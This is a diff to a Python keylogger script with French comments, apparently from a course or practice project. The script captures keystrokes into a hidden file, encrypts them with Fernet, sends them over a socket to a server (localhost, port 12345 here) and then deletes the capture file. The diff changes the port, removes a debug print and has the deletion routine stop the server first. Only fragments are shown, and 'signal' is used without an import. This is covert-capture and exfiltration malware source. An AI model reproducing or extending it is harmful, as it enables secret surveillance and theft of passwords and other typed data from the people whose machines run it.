@@ -1,7 +1,6 @@
 import keylogger
 import socket
 import requests
-import time  
 import os  
 from datetime import datetime
 from cryptography.fernet import Fernet
@@ -21,15 +20,13 @@ def launch_keylogger():
     return keylogger.listen_keyboard()
 
 def kill_server():
-    send_file_securely("127.0.0.1", 1234)
+    send_file_securely("127.0.0.1", 12345)
     os.kill(os.getpid(), signal.SIGINT)
-def stop_keylogger():
-    keylogger.stop_keylogger()
 
 # Fonction pour arrêter le keylogger et supprimer le fichier de capture
 def stop_and_delete_capture_file():
-    # Arrêter le keylogger
-    # Supprimer le fichier de capture
+    kill_server()
+
     file = ".document1.txt"  # Assurez-vous que c'est le bon chemin
     os.remove(file)
   
@@ -52,9 +49,7 @@ def send_file_securely(server_address, server_port):
         # Envoyer le contenu du fichier au serveur
         with open(".document1.txt", "r") as file:
             lines = file.read()
-            print(lines)
-            encrypted_lines = Fernet(key).encrypt(lines.encode())
-
+            encrypted_lines = Fernet(key).encrypt(lines.encode('utf-8'))
             client_socket.send(encrypted_lines)
     finally:
         # Fermer la connexion
@@ -68,9 +63,10 @@ if __name__ == "__main__":
 
     De plus, il faut lancer les programmes, LIRE et COMPRENDRE le code avant de CODER.
     """
+
     launch_keylogger()
     try:
-        send_file_securely("127.0.0.1", 1234)
+        send_file_securely("127.0.0.1", 12345)
     except KeyboardInterrupt:
         kill_server()
     
